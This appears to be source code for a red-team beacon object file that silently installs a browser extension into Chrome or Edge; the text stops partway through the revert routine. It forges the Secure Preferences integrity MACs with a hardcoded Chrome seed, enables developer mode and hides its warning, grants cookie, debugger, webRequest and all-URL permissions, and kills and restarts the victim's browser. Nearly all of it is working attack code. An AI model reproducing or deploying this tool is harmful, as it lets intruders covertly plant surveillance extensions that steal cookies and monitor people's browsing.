#include <windows.h>
#include "bofdefs.h"
#include "base.c"

#ifndef _MSC_VER
#define _MSC_VER 1
#define _SILENTCHROME_FAKE_MSVC
#endif
#include "cJSON.c"
#ifdef _SILENTCHROME_FAKE_MSVC
#undef _MSC_VER
#endif

#define ACTION_INSTALL 1
#define ACTION_REVERT  2

#ifdef DEBUG
#define DPRINTF(...) internal_printf(__VA_ARGS__)
#else
#define DPRINTF(...) do {} while(0)
#endif

static const BYTE CHROME_SEED[] = {
    0xe7, 0x48, 0xf3, 0x36, 0xd8, 0x5e, 0xa5, 0xf9,
    0xdc, 0xdf, 0x25, 0xd8, 0xf3, 0x47, 0xa6, 0x5b,
    0x4c, 0xdf, 0x66, 0x76, 0x00, 0xf0, 0x2d, 0xf6,
    0x72, 0x4a, 0x2a, 0xf1, 0x8a, 0x21, 0x2d, 0x26,
    0xb7, 0x88, 0xa2, 0x50, 0x86, 0x91, 0x0c, 0xf3,
    0xa9, 0x03, 0x13, 0x69, 0x68, 0x71, 0xf3, 0xdc,
    0x05, 0x82, 0x37, 0x30, 0xc9, 0x1d, 0xf8, 0xba,
    0x5c, 0x4f, 0xd9, 0xc8, 0x84, 0xb5, 0x05, 0xa8
};

static const BYTE EDGE_SEED[] = { 0 };

/* ============================================================
 * Crypto
 * ============================================================ */

BOOL compute_sha256(const BYTE* data, DWORD dataLen, BYTE* hashOut, DWORD hashOutLen)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    status = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    if (status != 0) goto cleanup;

    status = BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    if (status != 0) goto cleanup;

    status = BCRYPT$BCryptHashData(hHash, (PUCHAR)data, dataLen, 0);
    if (status != 0) goto cleanup;

    status = BCRYPT$BCryptFinishHash(hHash, hashOut, hashOutLen, 0);
    if (status != 0) goto cleanup;

    result = TRUE;

cleanup:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

BOOL compute_hmac_sha256(const BYTE* key, DWORD keyLen, const BYTE* data, DWORD dataLen, BYTE* hashOut, DWORD hashOutLen)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    status = BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (status != 0) goto cleanup;

    status = BCRYPT$BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, keyLen, 0);
    if (status != 0) goto cleanup;

    status = BCRYPT$BCryptHashData(hHash, (PUCHAR)data, dataLen, 0);
    if (status != 0) goto cleanup;

    status = BCRYPT$BCryptFinishHash(hHash, hashOut, hashOutLen, 0);
    if (status != 0) goto cleanup;

    result = TRUE;

cleanup:
    if (hHash) BCRYPT$BCryptDestroyHash(hHash);
    if (hAlg) BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

void bytes_to_hex(const BYTE* bytes, int len, char* out, BOOL uppercase)
{
    const char* fmt = uppercase ? "%02X" : "%02x";
    for (int i = 0; i < len; i++)
        sprintf(out + (i * 2), fmt, bytes[i]);
    out[len * 2] = 0;
}

/* ============================================================
 * Extension ID
 * ============================================================ */

void generate_extension_id(const char* extensionPath, char* extIdOut)
{
    int pathLen = strlen(extensionPath);
    int wideLen = pathLen + 1;
    wchar_t* widePath = (wchar_t*)intAlloc(wideLen * sizeof(wchar_t));
    if (!widePath) return;

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, extensionPath, -1, widePath, wideLen);
    int wideBytes = pathLen * sizeof(wchar_t);

    BYTE hash[32];
    if (!compute_sha256((const BYTE*)widePath, wideBytes, hash, 32))
    {
        intFree(widePath);
        return;
    }
    intFree(widePath);

    char hexStr[65];
    for (int i = 0; i < 32; i++)
        sprintf(hexStr + (i * 2), "%02x", hash[i]);
    hexStr[64] = 0;

    for (int i = 0; i < 32; i++)
    {
        int val;
        if (hexStr[i] >= '0' && hexStr[i] <= '9')
            val = hexStr[i] - '0';
        else
            val = hexStr[i] - 'a' + 10;
        extIdOut[i] = (char)(val + 'a');
    }
    extIdOut[32] = 0;
}

/* ============================================================
 * Install timestamp
 * ============================================================ */

void get_install_time(char* out, int outLen)
{
    FILETIME ft;
    KERNEL32$GetSystemTimeAsFileTime(&ft);
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    unsigned long long microseconds = uli.QuadPart / 10;
    snprintf(out, outLen, "%llu", microseconds);
}

/* ============================================================
 * Path helpers
 * ============================================================ */

static BOOL path_contains_ci(const char* path, const char* needle)
{
    int plen = strlen(path);
    int nlen = strlen(needle);
    for (int i = 0; i <= plen - nlen; i++)
    {
        int j;
        for (j = 0; j < nlen; j++)
        {
            if (tolower((unsigned char)path[i + j]) != tolower((unsigned char)needle[j]))
                break;
        }
        if (j == nlen)
            return TRUE;
    }
    return FALSE;
}

static BOOL is_exact_profile_path(const char* profilePath)
{
    return path_contains_ci(profilePath, "\\Default") || path_contains_ci(profilePath, "\\Profile");
}

void get_prefs_paths(const char* profilePath, const char* browser, char* securePrefsOut, char* prefsOut)
{
    if (is_exact_profile_path(profilePath))
    {
        sprintf(securePrefsOut, "%s\\Secure Preferences", profilePath);
        sprintf(prefsOut, "%s\\Preferences", profilePath);
    }
    else if (MSVCRT$_stricmp(browser, "chrome") == 0)
    {
        sprintf(securePrefsOut, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Secure Preferences", profilePath);
        sprintf(prefsOut, "%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences", profilePath);
    }
    else if (MSVCRT$_stricmp(browser, "msedge") == 0)
    {
        sprintf(securePrefsOut, "%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Secure Preferences", profilePath);
        sprintf(prefsOut, "%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences", profilePath);
    }
}

/* ============================================================
 * File I/O
 * ============================================================ */

BOOL file_exists(const char* path)
{
    DWORD attrs = KERNEL32$GetFileAttributesA(path);
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

char* read_file_to_string(const char* path, DWORD* outSize)
{
    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return NULL;

    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0)
    {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    char* buffer = (char*)malloc(fileSize + 1);
    if (!buffer)
    {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!KERNEL32$ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        free(buffer);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    buffer[fileSize] = '\0';
    KERNEL32$CloseHandle(hFile);

    if (outSize) *outSize = fileSize;
    return buffer;
}

BOOL write_string_to_file(const char* path, const char* data, DWORD dataLen)
{
    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    DWORD bytesWritten = 0;
    BOOL result = KERNEL32$WriteFile(hFile, data, dataLen, &bytesWritten, NULL);
    KERNEL32$CloseHandle(hFile);
    return result && (bytesWritten == dataLen);
}

BOOL backup_file(const char* path, const char* backupExt)
{
    char backupPath[512];
    sprintf(backupPath, "%s.%s", path, backupExt);
    return KERNEL32$CopyFileA(path, backupPath, FALSE);
}

BOOL create_backups(const char* securePrefsPath, const char* prefsPath, const char* backupExt)
{
    BOOL ok = TRUE;

    if (file_exists(securePrefsPath))
    {
        if (backup_file(securePrefsPath, backupExt))
            internal_printf("[+] Backed up: %s.%s\n", securePrefsPath, backupExt);
        else
        {
            internal_printf("[-] Backup failed\n");
            ok = FALSE;
        }
    }
    else
    {
        internal_printf("[-] Prefs not found\n");
        ok = FALSE;
    }

    if (file_exists(prefsPath))
    {
        if (backup_file(prefsPath, backupExt))
            internal_printf("[+] Backed up: %s.%s\n", prefsPath, backupExt);
        else
        {
            internal_printf("[-] Backup failed\n");
            ok = FALSE;
        }
    }
    else
    {
        internal_printf("[-] Prefs not found\n");
        ok = FALSE;
    }

    return ok;
}

cJSON* read_json_file(const char* path)
{
    DWORD fileSize = 0;
    char* content = read_file_to_string(path, &fileSize);
    if (!content)
    {
        DPRINTF("[-] Failed to read: %s\n", path);
        return NULL;
    }

    cJSON* json = cJSON_Parse(content);
    free(content);

    if (!json)
    {
        DPRINTF("[-] Failed to parse JSON: %s\n", path);
        return NULL;
    }

    return json;
}

BOOL write_json_file(const char* path, cJSON* json)
{
    char* rendered = cJSON_PrintUnformatted(json);
    if (!rendered)
        return FALSE;

    DWORD len = strlen(rendered);
    BOOL result = write_string_to_file(path, rendered, len);
    free(rendered);
    return result;
}

/* ============================================================
 * JSON helpers
 * ============================================================ */

cJSON* ensure_object(cJSON* parent, const char* key)
{
    cJSON* child = cJSON_GetObjectItemCaseSensitive(parent, key);
    if (!child || !cJSON_IsObject(child))
    {
        if (child) cJSON_DeleteItemFromObjectCaseSensitive(parent, key);
        child = cJSON_CreateObject();
        cJSON_AddItemToObject(parent, key, child);
    }
    return child;
}

/* ============================================================
 * HMAC computation for Chrome preferences
 * ============================================================ */

// Trim SID: "S-1-5-21-...-500" -> "S-1-5-21-...-" (remove last component)
void get_trimmed_sid(const char* sid, char* out, int outLen)
{
    const char* lastDash = strrchr(sid, '-');
    if (!lastDash)
    {
        strncpy(out, sid, outLen - 1);
        out[outLen - 1] = 0;
        return;
    }
    int len = (int)(lastDash - sid);
    if (len >= outLen) len = outLen - 1;
    memcpy(out, sid, len);
    out[len] = 0;
}

// Replace "<" with "\u003C" in a string (Chrome's JSON escaping)
char* escape_angle_brackets(const char* input)
{
    int count = 0;
    for (const char* p = input; *p; p++)
        if (*p == '<') count++;

    if (count == 0)
    {
        char* copy = (char*)malloc(strlen(input) + 1);
        strcpy(copy, input);
        return copy;
    }

    int newLen = strlen(input) + (count * 5);
    char* result = (char*)malloc(newLen + 1);
    char* dst = result;

    for (const char* p = input; *p; p++)
    {
        if (*p == '<')
        {
            memcpy(dst, "\\u003C", 6);
            dst += 6;
        }
        else
        {
            *dst++ = *p;
        }
    }
    *dst = 0;
    return result;
}

// Remove empty objects, arrays, and empty strings from cJSON tree
void remove_empty(cJSON* node)
{
    if (!node) return;

    if (cJSON_IsObject(node))
    {
        cJSON* child = node->child;
        while (child)
        {
            cJSON* next = child->next;
            remove_empty(child);

            if ((cJSON_IsObject(child) && !child->child) ||
                (cJSON_IsArray(child) && !child->child) ||
                (cJSON_IsString(child) && (!child->valuestring || child->valuestring[0] == '\0')))
            {
                cJSON_DetachItemViaPointer(node, child);
                cJSON_Delete(child);
            }
            child = next;
        }
    }
    else if (cJSON_IsArray(node))
    {
        cJSON* child = node->child;
        while (child)
        {
            cJSON* next = child->next;
            remove_empty(child);

            if ((cJSON_IsObject(child) && !child->child) ||
                (cJSON_IsArray(child) && !child->child) ||
                (cJSON_IsString(child) && (!child->valuestring || child->valuestring[0] == '\0')))
            {
                cJSON_DetachItemViaPointer(node, child);
                cJSON_Delete(child);
            }
            child = next;
        }
    }
}

BOOL calculate_hmac(cJSON* value, const char* path, const char* trimmedSid,
                    const BYTE* seed, DWORD seedLen, char* macOut, BOOL uppercase)
{
    cJSON* valueCopy = cJSON_Duplicate(value, 1);
    if (valueCopy && (cJSON_IsObject(valueCopy) || cJSON_IsArray(valueCopy)))
        remove_empty(valueCopy);

    char* jsonStr = cJSON_PrintUnformatted(valueCopy ? valueCopy : value);
    if (valueCopy) cJSON_Delete(valueCopy);
    if (!jsonStr) return FALSE;

    char* escaped = escape_angle_brackets(jsonStr);
    free(jsonStr);

    int msgLen = strlen(trimmedSid) + strlen(path) + strlen(escaped);
    char* message = (char*)malloc(msgLen + 1);
    sprintf(message, "%s%s%s", trimmedSid, path, escaped);
    free(escaped);

    BYTE hash[32];
    BOOL ok = compute_hmac_sha256(seed, seedLen, (const BYTE*)message, strlen(message), hash, 32);
    free(message);

    if (!ok) return FALSE;
    bytes_to_hex(hash, 32, macOut, uppercase);
    return TRUE;
}

BOOL calculate_super_mac(const char* filePath, const char* sid,
                         const BYTE* seed, DWORD seedLen, char* macOut)
{
    cJSON* data = read_json_file(filePath);
    if (!data) return FALSE;

    cJSON* protection = cJSON_GetObjectItemCaseSensitive(data, "protection");
    cJSON* macs = protection ? cJSON_GetObjectItemCaseSensitive(protection, "macs") : NULL;

    if (!macs)
    {
        cJSON_Delete(data);
        return FALSE;
    }

    char* macsJson = cJSON_PrintUnformatted(macs);
    cJSON_Delete(data);
    if (!macsJson) return FALSE;

    int msgLen = strlen(sid) + strlen(macsJson);
    char* message = (char*)malloc(msgLen + 1);
    sprintf(message, "%s%s", sid, macsJson);
    free(macsJson);

    BYTE hash[32];
    BOOL ok = compute_hmac_sha256(seed, seedLen, (const BYTE*)message, strlen(message), hash, 32);
    free(message);

    if (!ok) return FALSE;
    bytes_to_hex(hash, 32, macOut, TRUE);
    return TRUE;
}

/* ============================================================
 * Process management
 * ============================================================ */

BOOL get_process_sid(DWORD pid, char* sidOut, int sidOutLen)
{
    BOOL result = FALSE;
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
        hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc)
        return FALSE;

    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
    {
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    DWORD tokenInfoLen = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLen);
    if (tokenInfoLen == 0)
        goto cleanup;

    TOKEN_USER* tokenUser = (TOKEN_USER*)intAlloc(tokenInfoLen);
    if (!tokenUser)
        goto cleanup;

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, tokenInfoLen, &tokenInfoLen))
    {
        intFree(tokenUser);
        goto cleanup;
    }

    LPSTR sidStr = NULL;
    if (ADVAPI32$ConvertSidToStringSidA(tokenUser->User.Sid, &sidStr))
    {
        strncpy(sidOut, sidStr, sidOutLen - 1);
        sidOut[sidOutLen - 1] = 0;
        KERNEL32$LocalFree(sidStr);
        result = TRUE;
    }

    intFree(tokenUser);

cleanup:
    if (hToken) KERNEL32$CloseHandle(hToken);
    KERNEL32$CloseHandle(hProc);
    return result;
}

BOOL get_current_sid(char* sidOut, int sidOutLen)
{
    HANDLE hToken = NULL;
    BOOL result = FALSE;

    // Try thread token first (picks up impersonation from getsystem, etc.)
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken))
    {
        // No impersonation -- fall back to process token
        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, KERNEL32$GetCurrentProcessId());
        if (!hProc) return FALSE;
        if (!ADVAPI32$OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
        {
            KERNEL32$CloseHandle(hProc);
            return FALSE;
        }
        KERNEL32$CloseHandle(hProc);
    }

    DWORD tokenInfoLen = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLen);
    if (tokenInfoLen == 0)
        goto cleanup;

    TOKEN_USER* tokenUser = (TOKEN_USER*)intAlloc(tokenInfoLen);
    if (!tokenUser)
        goto cleanup;

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, tokenUser, tokenInfoLen, &tokenInfoLen))
    {
        intFree(tokenUser);
        goto cleanup;
    }

    LPSTR sidStr = NULL;
    if (ADVAPI32$ConvertSidToStringSidA(tokenUser->User.Sid, &sidStr))
    {
        strncpy(sidOut, sidStr, sidOutLen - 1);
        sidOut[sidOutLen - 1] = 0;
        KERNEL32$LocalFree(sidStr);
        result = TRUE;
    }

    intFree(tokenUser);

cleanup:
    if (hToken) KERNEL32$CloseHandle(hToken);
    return result;
}

int find_browser_pids(const char* browser, const char* targetSid, DWORD* pidsOut, int maxPids)
{
    char exeName[64];
    if (MSVCRT$_stricmp(browser, "chrome") == 0)
        strcpy(exeName, "chrome.exe");
    else
        strcpy(exeName, "msedge.exe");

    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    int count = 0;
    if (KERNEL32$Process32First(hSnap, &pe))
    {
        do
        {
            if (MSVCRT$_stricmp(pe.szExeFile, exeName) == 0)
            {
                char procSid[256] = {0};
                if (get_process_sid(pe.th32ProcessID, procSid, sizeof(procSid)))
                {
                    if (MSVCRT$_stricmp(procSid, targetSid) == 0)
                    {
                        if (count < maxPids)
                            pidsOut[count] = pe.th32ProcessID;
                        count++;
                    }
                }
            }
        } while (KERNEL32$Process32Next(hSnap, &pe));
    }

    KERNEL32$CloseHandle(hSnap);
    return count;
}

BOOL is_browser_running(const char* browser, const char* targetSid)
{
    DWORD pid;
    return find_browser_pids(browser, targetSid, &pid, 1) > 0;
}

int kill_browser_processes(const char* browser, const char* targetSid)
{
    DWORD pids[256];
    int count = find_browser_pids(browser, targetSid, pids, 256);

    int killed = 0;
    for (int i = 0; i < count && i < 256; i++)
    {
        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_TERMINATE, FALSE, pids[i]);
        if (hProc)
        {
            if (KERNEL32$TerminateProcess(hProc, 0))
            {
                DPRINTF("[+] Killed %s PID %lu\n", browser, pids[i]);
                killed++;
            }
            else
            {
                DPRINTF("[-] Failed to kill PID %lu (error %lu)\n", pids[i], KERNEL32$GetLastError());
            }
            KERNEL32$CloseHandle(hProc);
        }
        else
        {
            DPRINTF("[-] Failed to open PID %lu (error %lu)\n", pids[i], KERNEL32$GetLastError());
        }
    }

    return killed;
}

BOOL find_browser_exe(const char* browser, char* exePathOut, int exePathOutLen)
{
    const char* paths_chrome[] = {
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        NULL
    };
    const char* paths_edge[] = {
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        NULL
    };

    const char** paths = (MSVCRT$_stricmp(browser, "chrome") == 0) ? paths_chrome : paths_edge;

    for (int i = 0; paths[i]; i++)
    {
        DWORD attrs = KERNEL32$GetFileAttributesA(paths[i]);
        if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY))
        {
            strncpy(exePathOut, paths[i], exePathOutLen - 1);
            exePathOut[exePathOutLen - 1] = 0;
            return TRUE;
        }
    }

    return FALSE;
}

void get_user_data_dir(const char* profilePath, const char* browser, char* out, int outLen)
{
    if (is_exact_profile_path(profilePath))
    {
        strncpy(out, profilePath, outLen - 1);
        out[outLen - 1] = '\0';
        char* last = strrchr(out, '\\');
        if (last) *last = '\0';
    }
    else if (MSVCRT$_stricmp(browser, "chrome") == 0)
        snprintf(out, outLen, "%s\\AppData\\Local\\Google\\Chrome\\User Data", profilePath);
    else
        snprintf(out, outLen, "%s\\AppData\\Local\\Microsoft\\Edge\\User Data", profilePath);
}

BOOL restart_browser(const char* browser, const char* profilePath)
{
    char exePath[512];
    if (!find_browser_exe(browser, exePath, sizeof(exePath)))
    {
        internal_printf("[-] Browser executable not found\n");
        return FALSE;
    }
    DPRINTF("[+] Found browser: %s\n", exePath);

    char userDataDir[512];
    get_user_data_dir(profilePath, browser, userDataDir, sizeof(userDataDir));

    char cmdLine[1200];
    snprintf(cmdLine, sizeof(cmdLine),
        "\"%s\" --user-data-dir=\"%s\" --restore-last-session",
        exePath, userDataDir);

    DPRINTF("[+] Starting: %s\n", cmdLine);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = "WinSta0\\Default";
    memset(&pi, 0, sizeof(pi));

    if (!KERNEL32$CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        internal_printf("[-] Failed to start browser\n");
        return FALSE;
    }

    DPRINTF("[+] Browser started PID %lu\n", pi.dwProcessId);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    return TRUE;
}

/* ============================================================
 * Extension template builder
 * ============================================================ */

cJSON* build_extension_json(const char* extensionPath, const char* installTime)
{
    cJSON* ext = cJSON_CreateObject();

    // active_permissions
    cJSON* activePerm = cJSON_AddObjectToObject(ext, "active_permissions");
    cJSON* activeApi = cJSON_AddArrayToObject(activePerm, "api");
    cJSON_AddItemToArray(activeApi, cJSON_CreateString("activeTab"));
    cJSON_AddItemToArray(activeApi, cJSON_CreateString("cookies"));
    cJSON_AddItemToArray(activeApi, cJSON_CreateString("webNavigation"));
    cJSON_AddItemToArray(activeApi, cJSON_CreateString("webRequest"));
    cJSON_AddItemToArray(activeApi, cJSON_CreateString("scripting"));
    cJSON_AddItemToArray(activeApi, cJSON_CreateString("declarativeNetRequest"));
    cJSON* activeHost = cJSON_AddArrayToObject(activePerm, "explicit_host");
    cJSON_AddItemToArray(activeHost, cJSON_CreateString("<all_urls>"));
    cJSON_AddArrayToObject(activePerm, "manifest_permissions");
    cJSON_AddArrayToObject(activePerm, "scriptable_host");

    cJSON_AddObjectToObject(ext, "commands");
    cJSON_AddArrayToObject(ext, "content_settings");
    cJSON_AddNumberToObject(ext, "creation_flags", 38);

    // filtered_service_worker_events
    cJSON* filtered = cJSON_AddObjectToObject(ext, "filtered_service_worker_events");
    cJSON* webNavArr = cJSON_AddArrayToObject(filtered, "webNavigation.onCompleted");
    cJSON_AddItemToArray(webNavArr, cJSON_CreateObject());

    cJSON_AddStringToObject(ext, "first_install_time", installTime);
    cJSON_AddFalseToObject(ext, "from_webstore");

    // granted_permissions
    cJSON* grantedPerm = cJSON_AddObjectToObject(ext, "granted_permissions");
    cJSON* grantedApi = cJSON_AddArrayToObject(grantedPerm, "api");
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("activeTab"));
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("cookies"));
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("debugger"));
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("webNavigation"));
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("webRequest"));
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("scripting"));
    cJSON_AddItemToArray(grantedApi, cJSON_CreateString("declarativeNetRequest"));
    cJSON* grantedHost = cJSON_AddArrayToObject(grantedPerm, "explicit_host");
    cJSON_AddItemToArray(grantedHost, cJSON_CreateString("<all_urls>"));
    cJSON_AddArrayToObject(grantedPerm, "manifest_permissions");
    cJSON_AddArrayToObject(grantedPerm, "scriptable_host");

    cJSON_AddArrayToObject(ext, "incognito_content_settings");
    cJSON_AddObjectToObject(ext, "incognito_preferences");
    cJSON_AddStringToObject(ext, "last_update_time", installTime);
    cJSON_AddNumberToObject(ext, "location", 4);
    cJSON_AddTrueToObject(ext, "newAllowFileAccess");
    cJSON_AddStringToObject(ext, "path", extensionPath);
    cJSON_AddObjectToObject(ext, "preferences");
    cJSON_AddObjectToObject(ext, "regular_only_preferences");

    cJSON* swInfo = cJSON_AddObjectToObject(ext, "service_worker_registration_info");
    cJSON_AddStringToObject(swInfo, "version", "1.0.0");

    cJSON* swEvents = cJSON_AddArrayToObject(ext, "serviceworkerevents");
    cJSON_AddItemToArray(swEvents, cJSON_CreateString("cookies.onChanged"));
    cJSON_AddItemToArray(swEvents, cJSON_CreateString("webRequest.onBeforeRequest/s1"));

    cJSON_AddNumberToObject(ext, "state", 1);
    cJSON_AddFalseToObject(ext, "was_installed_by_default");
    cJSON_AddFalseToObject(ext, "was_installed_by_oem");
    cJSON_AddFalseToObject(ext, "withholding_permissions");

    return ext;
}

/* ============================================================
 * Core install logic
 * ============================================================ */

BOOL add_extension(const char* sid, const char* extensionPath, const char* extensionId,
                   const char* prefFilePath, const char* browser, BOOL isSecurePrefs)
{
    const BYTE* seed;
    DWORD seedLen;
    if (MSVCRT$_stricmp(browser, "chrome") == 0)
    {
        seed = CHROME_SEED;
        seedLen = sizeof(CHROME_SEED);
    }
    else
    {
        seed = EDGE_SEED;
        seedLen = sizeof(EDGE_SEED);
    }

    char installTime[32];
    get_install_time(installTime, sizeof(installTime));

    cJSON* extJson = build_extension_json(extensionPath, installTime);
    if (!extJson) return FALSE;

    cJSON* data = read_json_file(prefFilePath);
    if (!data)
    {
        cJSON_Delete(extJson);
        return FALSE;
    }

    cJSON* extensions = ensure_object(data, "extensions");

    if (isSecurePrefs)
    {
        cJSON* ui = ensure_object(extensions, "ui");
        cJSON_DeleteItemFromObjectCaseSensitive(ui, "developer_mode");
        cJSON_AddTrueToObject(ui, "developer_mode");
    }

    if (!isSecurePrefs)
    {
        cJSON* ui = ensure_object(extensions, "ui");
        cJSON_DeleteItemFromObjectCaseSensitive(ui, "dev_mode_warning_snooze_end_time");
        cJSON_AddStringToObject(ui, "dev_mode_warning_snooze_end_time", "99999999998000000");
        DPRINTF("[+] Set dev_mode_warning_snooze_end_time\n");
    }

    // profile.exit_type = "Normal"
    cJSON* profile = ensure_object(data, "profile");
    cJSON_DeleteItemFromObjectCaseSensitive(profile, "exit_type");
    cJSON_AddStringToObject(profile, "exit_type", "Normal");

    // extensions.settings.<extId> = extJson
    cJSON* settings = ensure_object(extensions, "settings");
    cJSON_DeleteItemFromObjectCaseSensitive(settings, extensionId);
    cJSON_AddItemToObject(settings, extensionId, extJson);

    // Trim SID for HMAC (remove last component after last dash)
    char trimmedSid[256];
    get_trimmed_sid(sid, trimmedSid, sizeof(trimmedSid));

    cJSON* protection = ensure_object(data, "protection");
    cJSON* macs = ensure_object(protection, "macs");

    if (isSecurePrefs)
    {
        // Extension HMAC (trimmed SID, uppercase)
        char extMacPath[256];
        sprintf(extMacPath, "extensions.settings.%s", extensionId);
        char extMac[65];
        if (!calculate_hmac(extJson, extMacPath, trimmedSid, seed, seedLen, extMac, TRUE))
        {
            DPRINTF("[-] Failed to calculate extension HMAC\n");
            cJSON_Delete(data);
            return FALSE;
        }
        DPRINTF("[+] Extension HMAC: %s\n", extMac);

        // Dev mode HMAC (trimmed SID, uppercase)
        char devMac[65];
        cJSON* trueVal = cJSON_CreateTrue();
        if (!calculate_hmac(trueVal, "extensions.ui.developer_mode", trimmedSid, seed, seedLen, devMac, TRUE))
        {
            DPRINTF("[-] Failed to calculate dev mode HMAC\n");
            cJSON_Delete(trueVal);
            cJSON_Delete(data);
            return FALSE;
        }
        cJSON_Delete(trueVal);
        DPRINTF("[+] Dev mode HMAC: %s\n", devMac);

        cJSON* extMacs = ensure_object(macs, "extensions");
        cJSON* settingsMacs = ensure_object(extMacs, "settings");
        cJSON_DeleteItemFromObjectCaseSensitive(settingsMacs, extensionId);
        cJSON_AddStringToObject(settingsMacs, extensionId, extMac);

        cJSON* uiMacs = ensure_object(extMacs, "ui");
        cJSON_DeleteItemFromObjectCaseSensitive(uiMacs, "developer_mode");
        cJSON_DeleteItemFromObjectCaseSensitive(uiMacs, "developer_mode_encrypted_hash");
        cJSON_AddStringToObject(uiMacs, "developer_mode", devMac);
    }

    // First write (without super_mac)
    if (!write_json_file(prefFilePath, data))
    {
        DPRINTF("[-] Failed to write: %s\n", prefFilePath);
        cJSON_Delete(data);
        return FALSE;
    }

    // Calculate super_mac from what we just wrote (uses full SID)
    char superMac[65];
    if (!calculate_super_mac(prefFilePath, sid, seed, seedLen, superMac))
    {
        DPRINTF("[-] Failed to calculate super_mac\n");
        cJSON_Delete(data);
        return FALSE;
    }
    DPRINTF("[+] Super MAC: %s\n", superMac);

    // Second write with super_mac
    cJSON_DeleteItemFromObjectCaseSensitive(protection, "super_mac");
    cJSON_AddStringToObject(protection, "super_mac", superMac);
    BOOL result = write_json_file(prefFilePath, data);

    cJSON_Delete(data);
    return result;
}

/* ============================================================
 * Core revert logic (surgical removal from live file)
 * ============================================================ */

BOOL remove_extension(const char* sid, const char* extensionId,
                      const char* prefFilePath, const char* browser, BOOL isSecurePrefs)
{
    const BYTE* seed;
    DWORD seedLen;
    if (MSVCRT$_stricmp(browser, "chrome") == 0)
    {
        seed = CHROME_SEED;
        seedLen = sizeof(CHROME_SEED);
    }
    else
    {
        seed = EDGE_SEED;
        seedLen = sizeof(EDGE_SEED);
    }

    cJSON* data = read_json_file(prefFilePath);
    if (!data) return FALSE;

    cJSON* extensions = cJSON_GetObjectItemCaseSensitive(data, "extensions");
    if (extensions)
    {
        cJSON* settings = cJSON_GetObjectItemCaseSensitive(extensions, "settings");
        if (settings)
